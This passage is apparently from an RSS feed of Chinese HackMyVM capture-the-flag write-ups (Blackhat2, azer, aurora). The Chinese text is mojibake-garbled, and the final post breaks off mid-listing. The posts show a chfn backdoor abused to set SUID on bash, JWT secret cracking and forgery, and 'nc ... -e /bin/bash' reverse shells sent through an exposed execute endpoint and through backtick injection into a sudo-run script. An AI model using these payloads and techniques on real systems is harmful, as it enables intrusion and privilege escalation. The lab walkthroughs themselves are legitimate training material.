Âú®Á≥ªÁªü‰∏≠Ê≤°ÊúâÂèëÁé∞ÊòéÊòæÁöÑÊèêÊùÉÁÇπÔºå‰ΩÜÈÄöËøá `dpkg -V` ÂëΩ‰ª§Êü•ÁúãÁ≥ªÁªüÊñá‰ª∂ÁöÑÂÆåÊï¥ÊÄß„ÄÇ

```bash
bash-5.2$ dpkg -V
missing   c /etc/apache2/sites-available/000-default.conf
missing   c /etc/apache2/sites-available/default-ssl.conf
??5?????? c /etc/grub.d/10_linux
??5??????   /usr/bin/chfn
```

ÂèëÁé∞ `/usr/bin/chfn` Ë¢´‰øÆÊîπÔºå‰∏îËØ•Êñá‰ª∂ÂèØËÉΩÂ≠òÂú®ÊèêÊùÉÊºèÊ¥û„ÄÇÊàë‰ª¨Â∞ÜÂÆÉÊãñÂÖ•idaÂàÜÊûê‰∏Ä‰∏ãÔºåÊàë‰ª¨‰ºöÂèëÁé∞Â¶Ç‰∏ãÂëΩ‰ª§Â≠óÁ¨¶‰∏≤Ôºö

![image](https://github.com/user-attachments/assets/fe1370ad-f488-4462-a38d-69b1a5acdb3b)
ËøôÊÆµÂ≠óÁ¨¶‰∏≤Ë°®Á§∫ÁöÑÊòØÔºö

```bash
nohup /tmp/system &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp;
```

`nohup`ÔºönohupÊòØ‰∏Ä‰∏™POSIXÂëΩ‰ª§ÔºåÊÑèÊÄùÊòØ‚Äú‰∏çÊåÇÊñ≠‚Äù
`/tmp/system`ÔºöÊÅ∂ÊÑèËÑöÊú¨

Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî® `chfn` ÂëΩ‰ª§‰øÆÊîπ `/bin/bash` ,Â∞ÜÂÆÉËÆæÊàêÊàë‰ª¨ÂèØ‰ª•ËøêË°åÁöÑÊùÉÈôêÔºå‰ªéËÄåËé∑Âæó root ÊùÉÈôê„ÄÇ

```bash
bash-5.2$ vi system
bash-5.2$ cat system 
bash u+s /bin/bash
bash-5.2$ /usr/bin/chfn
Changing the user information for root
Enter the new value, or press ENTER for the default
        Full Name [root]: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
bash-5.2$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
bash-5.2$ bash -p
bash-5.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

ÈÄöËøáÊ≠§ÊñπÂºèÔºåÊàêÂäüËé∑Âæó‰∫Ü root ÊùÉÈôê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Blackhat2.html</guid><pubDate>Fri, 27 Jun 2025 09:32:37 +0000</pubDate></item><item><title>hmv_azer</title><link>https://7r1UMPHK.github.io/post/hmv_azer.html</link><description># hmv_azer

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - azer](https://hackmyvm.eu/machines/machine.php?vm=Azer)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.235
**Êú¨Êú∫ IP**Ôºö192.168.205.141

---

# 1.Êâ´Êèè

‰ΩøÁî® `Nmap` ËøõË°åÂàùÊ≠•Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°ÂíåÁ´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS -p- -Pn -n -T4 192.168.205.235
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 11:19 CST
Nmap scan report for 192.168.205.235
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:07:E9:02 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
                                                           
```

ÁªìÊûúÊòæÁ§∫‰∏§‰∏™ÂºÄÊîæÁ´ØÂè£Ôºö

**80/tcp** - HTTP ÊúçÂä°
**3000/tcp** - ÂéüÂßãÊòæÁ§∫‰∏∫ PPPÔºå‰ΩÜÂÆûÈôÖ‰∏äÊòØ‰∏Ä‰∏™ web Â∫îÁî®Á®ãÂ∫èÔºåÁî®‰∫éÁî®Êà∑ËÆ§ËØÅ

---

# 2.Ë∏©ÁÇπ

`80`Á´ØÂè£È°µÊ≤°ÊúâÂèëÁé∞ÊòéÊòæÂà©Áî®ÁÇπÔºåË∏©ÁÇπ`3000`Á´ØÂè£

![image](https://github.com/user-attachments/assets/3b565e9c-e8cd-41ae-bf84-0cf6e7460d2e)

![image](https://github.com/user-attachments/assets/f2dcad05-b377-43e6-aa7b-159b04935536)

![image](https://github.com/user-attachments/assets/9ab7e04b-b4c3-4d36-9fdf-b4d1c827bf98)

Âú®Ëøõ‰∏ÄÊ≠•Êé¢Á¥¢‰∏≠ÂèëÁé∞Ôºå**3000** Á´ØÂè£ÁöÑÂ∫îÁî®Á®ãÂ∫è‰ºº‰πéÈÄöËøáÊâßË°å `.sh` ËÑöÊú¨Êù•ËøõË°åÂØÜÁ†ÅÈ™åËØÅ„ÄÇÂà©Áî®Ëøô‰∏ÄÁâπÊÄßÔºåÊàêÂäüÁªïËøá‰∫Ü**ÂØÜÁ†ÅÈ™åËØÅ**ÔºåÂπ∂Âª∫Á´ã‰∫Ü**ÂèçÂºπ Shell**„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.235] 46566
bash: cannot set terminal process group (483): Inappropriate ioctl for device
bash: no job control in this shell
azer@azer:~$ id
id
uid=1000(azer) gid=1000(azer) groups=1000(azer),100(users)

```

---

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

# 4.ÊèêÊùÉ

```bash
azer@azer:~$ hostname -I
192.168.205.235 10.10.10.1 172.17.0.1 

azer@azer:~$ ./fscan -h 10.10.10.1/24 -no -np -nopoc

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
10.10.10.1:80 open
10.10.10.10:80 open

```

`-np` Ë∑≥ËøáÂ≠òÊ¥ªÊ£ÄÊµã
`-no` ‰∏ç‰øùÂ≠òÊñá‰ª∂
`-nopoc` Ë∑≥Ëøáweb pocÊâ´Êèè

ÈÄöËøáÊâ´ÊèèÂÜÖÈÉ®ÁΩëÁªúÂèëÁé∞‰∫ÜÂè¶‰∏Ä‰∏™ IP `10.10.10.10` Ê≠£Âú®ËøêË°å **HTTP** ÊúçÂä°„ÄÇ

```bash
azer@azer:~$ nc 10.10.10.10 80
Hello
HTTP/1.1 400 Bad Request
Date: Wed, 08 Jan 2025 05:03:33 GMT
Server: Apache/2.4.58 (Unix)
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;400 Bad Request&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Bad Request&lt;/h1&gt;
&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
azer@azer:~$ curl 10.10.10.10
.:.AzerBulbul.:.
```

ËÆøÈóÆËØ•ÊúçÂä°Êó∂ÔºåÂæóÂà∞‰∫Ü‰∏Ä‰∏™ÁúãËµ∑Êù•ÂÉèÂØÜÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ

```bash
azer@azer:~$ su -
Password: 
root@azer:~# id
uid=0(root) gid=0(root) groups=0(root)

```

ÊàêÂäüÊèêÊùÉËá≥ rootsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_azer.html</guid><pubDate>Fri, 27 Jun 2025 09:32:35 +0000</pubDate></item><item><title>hmv_aurora</title><link>https://7r1UMPHK.github.io/post/hmv_aurora.html</link><description># hmv_aurora

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - aurora](https://hackmyvm.eu/machines/machine.php?vm=aurora)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.138
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 10:12 CST
Nmap scan report for 192.168.205.138
Host is up (0.00044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:68:BD:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
```

**3000**Â§ßÊ¶ÇÁéáÊòØ**web**È°µÈù¢

# 2.Ë∏©ÁÇπ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;Cannot GET /&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;Cannot GET /&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

```

Á¶ÅÊ≠¢`GET`ËÆøÈóÆÔºåÈÇ£Êàë‰ª¨Â∞±`POST`

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ feroxbuster -u 'http://192.168.205.138:3000' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -m POST
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher ü§ì                 ver: 2.11.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://192.168.205.138:3000
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.11.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [php, html, txt, md]
 üèÅ  HTTP methods          ‚îÇ [POST]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404     POST       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
401     POST        1l        2w       22c http://192.168.205.138:3000/login
400     POST        1l        6w       29c http://192.168.205.138:3000/register
401     POST        1l        2w       22c http://192.168.205.138:3000/Login
400     POST        1l        6w       29c http://192.168.205.138:3000/Register
401     POST        1l        1w       12c http://192.168.205.138:3000/execute

```

‰ΩøÁî®`curl`ËÆøÈóÆ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/login -X POST
Identifiants invalides                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/register -X POST
The 'role' field is not valid                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/execute -X POST 
Unauthorized                                                                                                                                    

```

Êàë‰ª¨Ê≥®ÂÜå‰∏Ä‰∏™Áî®Êà∑ËØïËØï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'admin\'}'
Not authorized !
```

ÂïäËøôÔºå‰∏¢Âéª`WFUZZ`ÁàÜÁ†¥‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -c -u 'http://192.168.205.138:3000/register' -X POST -H 'Content-Type: application/json' -d '{\'role\':\'FUZZ\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 6
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138:3000/register
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000003:   401        0 L      3 W        16 Ch       'admin'                                                             
000000022:   500        0 L      5 W        32 Ch       'user'                                                              

Total time: 58.91045
Processed Requests: 62284
Filtered Requests: 62282
Requests/sec.: 1057.265

```

ÁªßÁª≠Ê≥®ÂÜå

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\'}' 
Column 'username' cannot be null                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\'}'
Column 'password' cannot be null                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
Registration OK                                                                                                                                     
```

ÂéªÁôªÂΩïËØïËØï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/login -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
{'accessToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA'}
```

ËøôÂæà`jwt`ÔºåÂéªÂ∞ùËØïËß£Á†ÅÔºå[ÁΩëÁ´ô](https://jwt.io/)

![Image](https://github.com/user-attachments/assets/c55c1345-380f-4116-911b-b55fe1655ab6)

Â∞ÜÂØÜÈí•ÁàÜÁ†¥‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA' &gt; hash
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
nopassword       (?)   
1g 0:00:00:00 DONE (2025-01-23 10:31) 100.0g/s 4915Kp/s 4915Kc/s 4915KC/s 123456..trudy
Use the '--show' option to display all of the cracked passwords reliably
Session completed.
```

Êîπ‰∏Ä‰∏ãÂèÇÊï∞

![Image](https://github.com/user-attachments/assets/8c4fe2dd-1e58-4776-b407-e717b8dd3ef6)

Â∞ùËØï‰∏Ä‰∏ãÈÇ£‰∏™`execute`

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk'
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
&lt;meta charset='utf-8'&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;TypeError [ERR_INVALID_ARG_TYPE]: The &amp;quot;file&amp;quot; argument must be of type string. Received undefined&lt;br&gt; &amp;nbsp; &amp;nbsp;at validateString (internal/validators.js:120:11)&lt;br&gt; &amp;nbsp; &amp;nbsp;at normalizeSpawnArguments (child_process.js:411:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at spawn (child_process.js:547:16)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.execFile (child_process.js:237:17)&lt;br&gt; &amp;nbsp; &amp;nbsp;at exec (child_process.js:158:25)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:69:3&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:112:5&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;

```

`Authorization` Â§¥‰ª• `Bearer` ÂºÄÂ§¥„ÄÇÊä•Èîô‰∫ÜÔºåÊèêÁ§∫ '`file` ÂèÇÊï∞Â∫îËØ•ÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÊé•Êî∂Âà∞‰∫Ü `undefined`'„ÄÇÊ†πÊçÆÂÆÉÁöÑÂêçÂ≠óÂíåÊä•ÈîôÊàë‰ª¨ÂèØ‰ª•ÁåúÂá∫ËØ•ÁΩëÈ°µÂ∫îËØ•ÊòØÁî®Êù•ÊâßË°åÂëΩ‰ª§ÁöÑÔºåÊàë‰ª¨`wfuzz`‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -c -u 'http://192.168.205.138:3000/execute' -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk' -d '{\'FUZZ\':\'id\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 63
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138:3000/execute
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000008958:   200        1 L      3 W        54 Ch       'command'                                                           
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 19.47640
Processed Requests: 13025
Filtered Requests: 13024
Requests/sec.: 668.7578

```

Â∞ùËØïÊâßË°å‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk' -d '{'command':'id'}'  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Âºπ‰∏™shellÂõûÊù•

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk' -d '{'command':'nc 192.168.205.141 8888 -e /bin/bash'}' 
```

Âç°‰Ωè‰∫ÜÔºåÂç°‰ΩèÂ∞±ÂØπ‰∫Ü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888          
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 43824
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```bash
www-data@aurora:~$ ls -la
total 124
drwxr-xr-x   3 www-data www-data  4096 Apr  6  2023 .
drwxr-xr-x   3 root     root      4096 Mar  1  2023 ..
-rw-r--r--   1 www-data www-data  3271 Mar  1  2023 app.js
-rw-r--r--   1 www-data www-data  3169 Mar  2  2023 app.js.save
-rw-------   1 www-data www-data   153 Apr  6  2023 .bash_history
drwxr-xr-x 127 www-data www-data  4096 Mar  1  2023 node_modules
-rw-r--r--   1 www-data www-data   399 Mar  1  2023 package.json
-rw-r--r--   1 www-data www-data 95944 Mar  1  2023 package-lock.json
www-data@aurora:~$ cat .bash_history
clear
cd /home/doro/
clear
sudo -l
/usr/bin/python3 /home/doro/tools.py --ping
sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
clear
crontab -l
www-data@aurora:~$ sudo -l
Matching Defaults entries for www-data on aurora:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on aurora:
    (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *
www-data@aurora:~$ cat /home/doro/tools.py
import os
import sys

def main():
    if len(sys.argv) &lt; 2:
        print_help()
        return
  
    option = sys.argv[1]
    if option == '--ping':
        ping()
    elif option == '--traceroute':
        traceroute_ip()
    else:
        print('Invalid option.')
        print_help()

def print_help():
    print('Usage: python3 network_tool.py &lt;option&gt;')
    print('Options:')
    print('--ping           Ping an IP address')
    print('--traceroute     Perform a traceroute on an IP address')

def ping():
    ip_address = input('Enter an IP address: ')

    forbidden_chars = ['&amp;', ';', '(', ')', '||', '|', '&gt;', '&lt;', '*', '?']
    for char in forbidden_chars:
        if char in ip_address:
            print('Forbidden character found: {}'.format(char))
            sys.exit(1)
  
    os.system('ping -c 2 ' + ip_address)

def traceroute_ip():
    ip_address = input('Enter an IP address: ')

    if not is_valid_ip(ip_address):
        print('Invalid IP address.')
        return
  
    traceroute_command = 'traceroute {}'.format(ip_address)
    os.system(traceroute_command)

def is_valid_ip(ip_address):
    octets = ip_address.split('.')
    if len(octets) != 4:
        return False
    for octet in octets:
        if not octet.isdigit() or int(octet) &lt; 0 or int(octet) &gt; 255:
            return False
    return True

if __name__ == '__main__':
    main()
www-data@aurora:~$ ls -la /home/doro/
total 36
drwxr-xr-x 4 doro doro 4096 Mar  8  2023 .
drwxr-xr-x 3 root root 4096 Mar  6  2023 ..
lrwxrwxrwx 1 root root    9 Mar  3  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 doro doro  220 Mar  3  2023 .bash_logout
-rw-r--r-- 1 doro doro 3526 Mar  3  2023 .bashrc
drwxr-xr-x 3 doro doro 4096 Mar  4  2023 .local
-rw-r--r-- 1 doro doro  807 Mar  3  2023 .profile
drwx------ 2 doro doro 4096 Mar  4  2023 .ssh
-rw-r--r-- 1 root root 1380 Mar  7  2023 tools.py
-rwx------ 1 doro doro   33 Mar  3  2023 user.txt

```

Êàë‰ª¨Â∞ùËØï‰∏Ä‰∏ã‰ª£Á†ÅÊ≥®ÂÖ•ÔºåÈúÄË¶ÅÊ≥®ÊÑè‰ªñÁ¶ÅÁî®‰∫Ü`&amp;`, `;`, `(`, `)`, `||`, `|`, `&gt;`, `&lt;`, `*`, `?`

```bash
www-data@aurora:/tmp$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `id`
ping: groups=1000(doro): Name or service not known
```

ÊâßË°åÊàêÂäüÔºåÂ∞ùËØïÂºπshell

```bash
www-data@aurora:/tmp$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `nc 192.168.205.141 8888 -e /bin/bash` 
```

ÊàêÂäüÂºπ‰∫ÜÂõûÊù•

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 57096
id
uid=1000(doro) gid=1000(doro) groups=1000(doro)

```

Ëß¶Âèë‰∏Ä‰∏ãÁ®≥ÂÆö ShellÂ∞èËøûÊãõ

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

ÁªßÁª≠ÊèêÊùÉ

```bash
doro@aurora:~$ id
uid=1000(doro) gid=1000(doro) groups=1000(doro)
doro@aurora:~$ sudo -l
[sudo] password for doro: 
sudo: a password is required
doro@aurora:~$ cd /home/doro/
doro@aurora:~$ ls -al
total 36
drwxr-xr-x 4 doro doro 4096 Mar  8  2023 .
drwxr-xr-x 3 root root 4096 Mar  6  2023 ..
